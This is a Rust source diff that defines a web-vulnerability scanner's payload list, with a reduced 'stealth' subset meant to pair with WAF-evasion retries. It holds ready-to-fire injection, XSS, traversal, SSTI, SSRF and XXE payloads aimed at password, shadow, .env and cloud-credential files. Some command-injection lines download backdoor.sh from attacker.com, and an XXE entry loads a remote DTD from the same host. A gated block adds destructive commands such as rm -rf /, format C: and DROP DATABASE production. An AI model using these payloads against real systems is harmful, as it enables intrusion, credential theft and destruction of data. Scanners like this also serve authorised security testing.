@@ -1,0 +1,313 @@
+pub fn get_basic_payloads(aggressive: bool, confirm_destructive: bool) -> Vec<String> {
+    get_basic_payloads_inner(aggressive, confirm_destructive, false)
+}
+
+/// FIX v9.2: em modo WAF bypass o retry já gera variantes ofuscadas
+/// (case mix, /**/, double-encode, tabs), então testar 150 payloads
+/// repetidos × waits torna o scan de horas. Subconjunto representativo
+/// de ~45 payloads cobre cada categoria; as variações vêm do bypass.
+pub fn get_basic_payloads_bypass(aggressive: bool, confirm_destructive: bool) -> Vec<String> {
+    get_basic_payloads_inner(aggressive, confirm_destructive, true)
+}
+
+fn get_basic_payloads_inner(aggressive: bool, confirm_destructive: bool, stealth: bool) -> Vec<String> {
+    let mut payloads = vec![
+        // ===== SQL Injection =====
+        "' OR '1'='1".to_string(),
+        "'; DROP TABLE users; --".to_string(),
+        "' UNION SELECT null,username,password FROM users --".to_string(),
+        "%27%20OR%20%271%27%3D%271".to_string(),
+        "%27%3B%20DROP%20TABLE%20users%3B%20--".to_string(),
+        "%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users%20--".to_string(),
+        "%2527%2520OR%2520%25271%2527%253D%25271".to_string(),
+        "'/**/OR/**/'1'='1".to_string(),
+        "' OR 1=1#".to_string(),
+        "' OR 1=1-- -".to_string(),
+        "admin'--".to_string(),
+        "admin'#".to_string(),
+        "admin'/*".to_string(),
+        "' oR '1'='1".to_string(),
+        "' Or '1'='1".to_string(),
+        "' UnIoN SeLeCt null,username,password FrOm users --".to_string(),
+        "'\nOR\n'1'='1".to_string(),
+        "'\r\nOR\r\n'1'='1".to_string(),
+        "' OR '1'||'1'='1".to_string(),
+        "' OR CONCAT('1','1')='11".to_string(),
+        "' OR (SELECT COUNT(*) FROM users) > 0 --".to_string(),
+        "' OR EXISTS(SELECT * FROM users) --".to_string(),
+        "' AND 1=1 --".to_string(),
+        "' AND 1=2 --".to_string(),
+        "' OR 1=1 --".to_string(),
+        "' OR 1=2 --".to_string(),
+        "' OR SLEEP(5) --".to_string(),
+        "' OR pg_sleep(5) --".to_string(),
+        "' WAITFOR DELAY '0:0:5' --".to_string(),
+
+        // ===== NoSQL Injection =====
+        "{'$ne': ''}".to_string(),
+        "{'$gt': ''}".to_string(),
+        "{'$regex': '.*'}".to_string(),
+        "{'$or': [{}, {'$ne': ''}]}".to_string(),
+        "{$ne: ''}".to_string(),
+        "{\"$ne\": null}".to_string(),
+        "{\"$regex\": \".*\"}".to_string(),
+        "{'username': {'$ne': null}}".to_string(),
+        "{'password': {'$regex': '.*'}}".to_string(),
+        "%7B%27%24ne%27%3A%20%27%27%7D".to_string(),
+        "%7B%22%24ne%22%3A%20null%7D".to_string(),
+
+        // ===== XSS =====
+        "<script>alert('XSS')</script>".to_string(),
+        "<img src=x onerror=alert(1)>".to_string(),
+        "javascript:alert('XSS')".to_string(),
+        "<svg/onload=alert(1)>".to_string(),
+        "<body onload=alert(1)>".to_string(),
+        "%3Cscript%3Ealert(%27XSS%27)%3C/script%3E".to_string(),
+        "%3Cimg%20src=x%20onerror=alert(1)%3E".to_string(),
+        "alert('XSS')".to_string(),
+        "prompt('XSS')".to_string(),
+        "confirm('XSS')".to_string(),
+        "<div onmouseover=alert(1)>".to_string(),
+        "<input onfocus=alert(1)>".to_string(),
+        "<iframe onload=alert(1)>".to_string(),
+        "&#60;script&#62;alert('XSS')&#60;/script&#62;".to_string(),
+        "<scr<script>ipt>alert(1)</scr</script>ipt>".to_string(),
+        "<SCRIPT>alert(1)</SCRIPT>".to_string(),
+        "<ScRiPt>alert(1)</ScRiPt>".to_string(),
+        "<img src=x onerror=\"alert(1)\">".to_string(),
+        "<img src=x onerror=alert`1`>".to_string(),
+
+        // ===== Path Traversal =====
+        "../../etc/passwd".to_string(),
+        "..\\..\\windows\\win.ini".to_string(),
+        "../../../../etc/passwd".to_string(),
+        "....//....//....//etc/passwd".to_string(),
+        "..%2f..%2f..%2fetc%2fpasswd".to_string(),
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string(),
+        "..%252f..%252f..%252fetc%252fpasswd".to_string(),
+        "..../..../..../etc/passwd".to_string(),
+        "..\\..\\..\\windows\\win.ini".to_string(),
+        "..%5c..%5c..%5cwindows%5cwin.ini".to_string(),
+
+        // ===== LFI =====
+        "../../../etc/passwd".to_string(),
+        "../../../../etc/passwd".to_string(),
+        "../../../../../etc/passwd".to_string(),
+        "../../../../../../etc/passwd".to_string(),
+        "../../../../../../../etc/passwd".to_string(),
+        "../../../../../../../../etc/passwd".to_string(),
+        "/etc/passwd".to_string(),
+        "etc/passwd".to_string(),
+        "..\\..\\windows\\win.ini".to_string(),
+        "..\\..\\..\\windows\\win.ini".to_string(),
+        "..\\..\\..\\..\\windows\\win.ini".to_string(),
+        "C:\\windows\\win.ini".to_string(),
+        "C:\\boot.ini".to_string(),
+        "..\\..\\..\\..\\boot.ini".to_string(),
+        "../../../etc/hosts".to_string(),
+        "../../../etc/shadow".to_string(),
+        "../../../etc/group".to_string(),
+        "../../../proc/self/environ".to_string(),
+        "../../../proc/version".to_string(),
+        "../../../var/log/apache2/access.log".to_string(),
+        "../../../var/log/nginx/access.log".to_string(),
+        "../../../var/log/httpd/access_log".to_string(),
+        "../../../var/log/auth.log".to_string(),
+        "../../../var/log/syslog".to_string(),
+        "../../../.htaccess".to_string(),
+        "../../../.env".to_string(),
+        "../../../config.php".to_string(),
+        "../../../wp-config.php".to_string(),
+        "../../../index.php".to_string(),
+        "..%2f..%2f..%2fetc%2fpasswd".to_string(),
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string(),
+        "..%252f..%252f..%252fetc%252fpasswd".to_string(),
+        "..%5c..%5c..%5cwindows%5cwin.ini".to_string(),
+        "../../../etc/passwd%00".to_string(),
+        "../../../etc/passwd%00.jpg".to_string(),
+        "../../../etc/passwd%00.png".to_string(),
+        "..%2f..%2f..%2fetc%2fpasswd%00".to_string(),
+        "..%2f..%2f..%2fetc%2fpasswd%00.jpg".to_string(),
+        "php://filter/convert.base64-encode/resource=../../../../etc/passwd".to_string(),
+        "php://filter/convert.base64-encode/resource=../../../../wp-config.php".to_string(),
+        "php://filter/convert.base64-encode/resource=../../../../config.php".to_string(),
+        "php://filter/convert.base64-encode/resource=../../../../index.php".to_string(),
+        "php://filter/convert.base64-encode/resource=../../../../.env".to_string(),
+        "php://filter/convert.base64-encode/resource=../../../../.htaccess".to_string(),
+
+        // ===== Command Injection =====
+        "echo INJ_TEST_OUTPUT && whoami".to_string(),
+        "echo INJ_TEST_OUTPUT & whoami".to_string(),
+        "|| whoami".to_string(),
+        "| dir".to_string(),
+        "; ls -la".to_string(),
+        "&& whoami".to_string(),
+        "`whoami`".to_string(),
+        "$(whoami)".to_string(),
+        "%7C%7C%20whoami".to_string(),
+        "%3B%20ls%20-la".to_string(),
+        "%26%26%20whoami".to_string(),
+        "||whoami".to_string(),
+        "|whoami".to_string(),
+        ";whoami".to_string(),
+        "&whoami".to_string(),
+        "`whoami`".to_string(),
+        "$(whoami)".to_string(),
+        "|| wget http://attacker.com/backdoor.sh".to_string(),
+        "| curl http://attacker.com/backdoor.sh".to_string(),
+
+        // ===== SSTI =====
+        "{{7*7}}".to_string(),
+        "${7*7}".to_string(),
+        "#{7*7}".to_string(),
+        "{{config}}".to_string(),
+        "{{self.__class__.__mro__}}".to_string(),
+        "{{''.__class__.__mro__[2].__subclasses__()}}".to_string(),
+        "${{7*7}}".to_string(),
+        "{{7*'7'}}".to_string(),
+        "%7B%7B7*7%7D%7D".to_string(),
+        "%24%7B7*7%7D".to_string(),
+        "%23%7B7*7%7D".to_string(),
+
+                // ===== SSRF =====
+
+        "http://169.254.169.254/latest/meta-data/".to_string(),
+        "http://127.0.0.1:8080/admin".to_string(),
+        "http://localhost:6379".to_string(),
+        "http://169.254.169.254/latest/user-data/".to_string(),
+        "http://metadata.google.internal/".to_string(),
+        "http://169.254.169.254.nip.io/".to_string(),
+        "http://127.0.0.1.nip.io/".to_string(),
+        "http://localhost.nip.io/".to_string(),
+        "http://169.254.169.254.sslip.io/".to_string(),
+
+        // ===== GraphQL =====
+        "__typename".to_string(),
+        "__schema".to_string(),
+        "query { __typename }".to_string(),
+        "query { __schema { types { name } } }".to_string(),
+        "mutation { __typename }".to_string(),
+        "query { __type(name:\"User\") { fields { name } } }".to_string(),
+        "query { __schema { queryType { fields { name } } } }".to_string(),
+
+        // ===== CSRF (apenas para detectar formulários sem token) =====
+        "<input type=\"hidden\" name=\"csrf_token\"".to_string(),
+        "<input type=\"hidden\" name=\"_token\"".to_string(),
+        "<input type=\"hidden\" name=\"authenticity_token\"".to_string(),
+        "<input type=\"hidden\" name=\"csrfmiddlewaretoken\"".to_string(),
+        "<input type=\"hidden\" name=\"__RequestVerificationToken\"".to_string(),
+
+        // ===== XXE =====
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>".to_string(),
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///C:/windows/win.ini\">]><root>&test;</root>".to_string(),
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&test;</root>".to_string(),
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&test;</root>".to_string(),
+        "%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20test%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26test%3B%3C%2Froot%3E".to_string(),
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\"> %remote;]>".to_string(),
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///nonexistent\">]><root>&test;</root>".to_string(),
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"http://127.0.0.1:8080/admin\">]><root>&test;</root>".to_string(),
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"http://localhost:6379\">]><root>&test;</root>".to_string(),
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><root>&test;</root>".to_string(),
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"php://filter/convert.base64-encode/resource=C:/windows/win.ini\">]><root>&test;</root>".to_string(),
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"expect://id\">]><root>&test;</root>".to_string(),
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"expect://whoami\">]><root>&test;</root>".to_string(),
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"expect://ls -la\">]><root>&test;</root>".to_string(),
+        "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></root>".to_string(),
+        "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///C:/windows/win.ini\" parse=\"text\"/></root>".to_string(),
+        "\x3c\x00\x3f\x00\x78\x00\x6d\x00\x6c\x00\x20\x00\x76\x00\x65\x00\x72\x00\x73\x00\x69\x00\x6f\x00\x6e\x00\x3d\x00\x22\x00\x31\x00\x2e\x00\x30\x00\x22\x00\x3f\x00\x3e\x00".to_string(),
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root><![CDATA[&test;]]></root>".to_string(),
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY a \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\">]><root>&a;&a;&a;&a;&a;</root>".to_string(),
+
+        // ===== Open Redirect =====
+        "//evil.com".to_string(),
+        "/%2F/evil.com".to_string(),
+        "//google.com/%2F%2Fevil.com".to_string(),
+        "https://evil.com".to_string(),
+        "//evil.com%2F%2Fgoogle.com".to_string(),
+        // Bypass por userinfo: "site.com@evil.com" / "site.com@https://evil.com"
+        // (o navegador trata a parte antes do @ como credencial e navega para evil.com)
+        "site.com@evil.com".to_string(),
+        "site.com@https://evil.com".to_string(),
+        "%40evil.com".to_string(),
+        "//%65%76%69%6c%2e%63%6f%6d".to_string(),
+        "///evil.com".to_string(),
+        "http://evil.com".to_string(),
+        "https://evil.com".to_string(), 
+
+        // ===== LDAP Injection =====
+        "*)(uid=*".to_string(),
+        "*)(|(uid=*".to_string(),
+        "*)(&(uid=*".to_string(),
+        "admin*)((|userPassword=*)".to_string(),
+        "admin*)(&(userPassword=*)".to_string(),
+        "*)(uid=admin".to_string(),
+        "uid=*)(&(uid=*".to_string(),
+        "cn=*)(&(objectClass=*)".to_string(),
+        "*)(objectClass=*".to_string(),
+        "*)(|(objectClass=*)".to_string(),
+        
+        // ===== Host Header Injection =====
+        "attacker.com".to_string(),
+        "evil.com".to_string(),
+        "localhost".to_string(),
+        "127.0.0.1".to_string(),
+        "169.254.169.254".to_string(),
+        "internal.example.com".to_string(),
+        "admin.example.com".to_string(),
+        "api.example.com".to_string(),
+        "*.evil.com".to_string(),
+        "https://evil.com".to_string(),
+        
+        // ===== Content Spoofing =====
+        "Content-Type: text/html".to_string(),
+        "<html><body>Hacked</body></html>".to_string(),
+        "<h1>Unauthorized Access</h1>".to_string(),
+        "<div class=\"error\">System Compromised</div>".to_string(),
+        "<iframe src=\"https://evil.com\"></iframe>".to_string(),
+        "<meta http-equiv=\"refresh\" content=\"0; url=https://evil.com\">".to_string(),
+        "<script>window.location='https://evil.com'</script>".to_string(),
+        "X-Forwarded-For: 127.0.0.1".to_string(),
+        "X-Originating-IP: 127.0.0.1".to_string(),
+        "X-Remote-IP: 127.0.0.1".to_string(),
+    ];
+
+    // ===== Payloads Destrutivos (apenas se confirmado explicitamente) =====
+    if aggressive && confirm_destructive {
+        payloads.extend(vec![
+            "'; DROP DATABASE production; --".to_string(),
+            "'; EXEC xp_cmdshell('whoami'); --".to_string(),
+            "'; SELECT * FROM information_schema.tables; --".to_string(),
+            "rm -rf /".to_string(),
+            "format C: /Y".to_string(),
+            "del /f /s /q *.*".to_string(),
+            "shutdown -s -t 0".to_string(),
+        ]);
+    }
+    if !stealth {
+        payloads
+    } else {
+        // FIX v9.2: subconjunto representativo por categoria.
+        // O retry ofuscativo (case mix, /**/, double-encode, tabs)
+        // cobre as variações; sem stealth o scan levaria horas.
+        let keep = |p: &str| -> bool {
+            let q = "\u{0027}";
+            if p.starts_with(&format!("{} OR {}1{}={}1", q, q, q, q)) || p == &format!("admin{}--", q) || p == &format!("{q}/**/OR/**/{q}1{q}={q}1") || p == &format!("{q} oR {q}1{q}={q}1") || p.starts_with(&format!("{q} OR 1=1")) { return true; }
+            if p == "{'$ne': ''}" || p == "{\"$ne\": null}" { return true; }
+            if p == "<script>alert('XSS')</script>" || p == "<img src=x onerror=alert(1)>" || p == "<svg/onload=alert(1)>" || p == "<ScRiPt>alert(1)</ScRiPt>" { return true; }
+            if p == "../../etc/passwd" || p == "..%2f..%2f..%2fetc%2fpasswd" || p == "....//....//....//etc/passwd" { return true; }
+            if p == "../../../etc/passwd" || p == "../../../../etc/passwd" || p == "..%252f..%252f..%252fetc%252fpasswd" || p.starts_with("php://filter") && p.contains("etc/passwd") { return true; }
+            if p == "echo INJ_TEST_OUTPUT && whoami" || p == "; ls -la" || p == "$(whoami)" || p == "`whoami`" || p == "||whoami" { return true; }
+            if p == "{{7*7}}" || p == "${7*7}" || p == "{{config}}" || p == "%7B%7B7*7%7D%7D" { return true; }
+            if p == "http://169.254.169.254/latest/meta-data/" || p == "http://127.0.0.1:8080/admin" || p == "http://169.254.169.254.nip.io/" { return true; }
+            if p == "__schema" || p == "query { __type(name:\"User\") { fields { name } } }" { return true; }
+            if p == "<input type=\"hidden\" name=\"csrf_token\"" { return true; }
+            if (p.starts_with("<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">") && !p.contains("CDATA") && !p.contains("&a;")) || (p.starts_with("<root xmlns:xi") && p.contains("etc/passwd")) { return true; }
+            if p == "//evil.com" || p == "https://evil.com" || p == "site.com@evil.com" || p == "%40evil.com" || p == "///evil.com" { return true; }
+            if p == "*)(uid=*" || p == "*)(|(uid=*" { return true; }
+            if p == "evil.com" || p == "*.evil.com" { return true; }
+            if p == "<script>window.location='https://evil.com'</script>" || p == "X-Forwarded-For: 127.0.0.1" { return true; }
+            false
+        };
+        payloads.into_iter().filter(|p| keep(p)).collect()
+    }
+}
